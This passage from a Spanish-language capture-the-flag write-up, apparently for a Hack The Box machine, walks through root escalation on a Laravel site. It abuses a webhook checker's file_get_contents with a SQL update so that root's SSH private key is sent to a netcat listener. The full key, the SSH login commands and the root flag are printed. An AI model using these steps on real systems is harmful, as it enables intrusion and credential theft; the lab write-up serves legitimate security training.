El programa se puede transferir a la máquina víctima desplegando un servidor en *python* `(python3 -m http.server 80)` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como */tmp* o */dev/shm*) hacer un *wget* para descargar el archivo.

Cada cierto tiempo se están ejecutando las siguientes tareas por el usuario ***root***:

```bash
CMD: UID=0    PID=19950  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1
	CMD: UID=0    PID=19960  | mysql laravel --execute TRUNCATE tasks
```

* Respecto a la primera instrucción, el usuario *root* se mete en el directorio */var/www/html* y ejecuta *php artisan schedule:run*.  ***Artisan*** es una herramienta de línea de comandos incluida en *Laravel*. Este comando específico se utiliza para **ejecutar tareas programadas** en *Laravel*. Finalmente, *>> /dev/null 2>&1* se emplea para evitar que la salida del comando y los mensajes de error se muestren en la pantalla.
* La segunda instrucción elimina todas las filas de la tabla *tasks*.

En resumen, parece que primero *root* ejecuta una serie de **tareas** y luego las borra. Recordemos que el sitio web tenía una opción de **crear** un *Webhook*. Probablemente, lo que se está haciendo es **ejecutar** estas tareas y luego **borrarlas**. Si las borra de la tabla *tasks*, es porque seguramente se guarden en esta misma tabla.

Podemos hacer una prueba. Primero creamos una tarea:

![imagen 8](Pasted image 20230104115720.png)

Luego, conectados a MySQL con las credenciales encontradas anteriormente, listamos el contenido de la tabla *tasks*:
![imagen 9](Pasted image 20230104115758.png)


Efectivamente, ahí se encuentra el contenido de nuestro *webhook*. Pasado un tiempo, se ejecuta la tarea:
![imagen 10](Pasted image 20230104115847.png)


Y el contenido de la tabla se borra.

#### Inspeccionando código fuente

El siguiente archivo, encontrado en */var/www/html/app/Http/Controllers/HealthChecker.php*, contiene toda la lógica de la página web:

```php
<?php

namespace App\Http\Controllers;

class HealthChecker
{
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
	    $json['body'] = $res;
	    if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

            for ($i = 0; $i <= count($http_response_header) - 1; $i++) {

                $split = explode(':', $http_response_header[$i], 2);

                if (count($split) == 2) {
                    $headers[trim($split[0])] = trim($split[1]);
                } else {
                    error_log("invalid header pair: $http_response_header[$i]\n");
                }

            }

	    $json['headers'] = $headers;
	    }

        } else {
            $json['health'] = "down";
        }

        $content = json_encode($json);

        // send
        $curl = curl_init($webhookUrl);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPHEADER,
            array("Content-type: application/json"));
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
        curl_exec($curl);
        curl_close($curl);

        return $json;

    }
}
```

La función comprueba si puede obtener el contenido de la URL especificada en `$monitoredUrl` utilizando la función `file_get_contents`. Si se puede obtener el contenido, la función agrega una clave `health` con el valor *up* al vector `$json`, y también agrega el contenido obtenido y el encabezado HTTP de respuesta al vector `$json`. Si no se puede obtener el contenido, la función agrega una clave `health` con el valor *down* al vector `$json`.

Existe un **problema de implementación** al leer el *monitoredUrl*. Se supone que ***@file_get_contents*** está leyendo el contenido de una web, pero, ¿y si en vez de una URL, igualamos *monitoredUrl* a un archivo del sistema? La variable *res* se igualará al contenido del archivo y posteriormente este contenido viajará en el *body*. Desde el exterior no podíamos, ya que teníamos que poner una URL que fuera válida. Pero ahora, podemos intentar modificar una fila de la tabla *tasks* para que apunte a un archivo del sistema y que nos lo envíe.

### Explotando webhooks

Para podernos convertir en *root*, lo más conveniente, pudiendo listar ficheros del sistema, es obtener la **clave privada SSH** de *root*. Esta se encuentra en la ruta */root/.ssh/id_rsa*. Así, luego nos podremos conectar por SSH.

Los pasos para obtenerla serán:

1 - Ponernos en escucha por un puerto, en mi caso, el **81**:

```bash
nc -nlvp 81
```

2 - Crear un *webhook*:


![imagen 11](Pasted image 20230104121136.png)


3 - Modificar el *webhook* desde la base de datos con el siguiente comando:

```sql
mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
```

Resultado:
![imagen 12](Pasted image 20230104121607.png)


4 - Al cabo de un rato, recibiremos por el puerto 81 la clave privada de *root*:

```bash
cat body.txt | jq .body  | sed 's/\\n/\n/g' | tr -d "\""
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
-----END RSA PRIVATE KEY-----
```

Finalmente, para conectarnos, la guardamos en un fichero, le damos permisos 600 y nos conectamos por SSH:

```bash
cat info.txt | jq .body  | sed 's/\\n/\n/g' | tr -d "\"" > id_rsa
chmod 600 id_rsa
ssh root@10.10.11.176 -i id_rsa
```

### root.txt

Encontraremos la segunda *flag* en el *homedir* de *root*:

```bash
root@health:~## cd /root/
root@health:~## cat root.txt
8a2a95667f1d881497732c87c7264bf3
```
















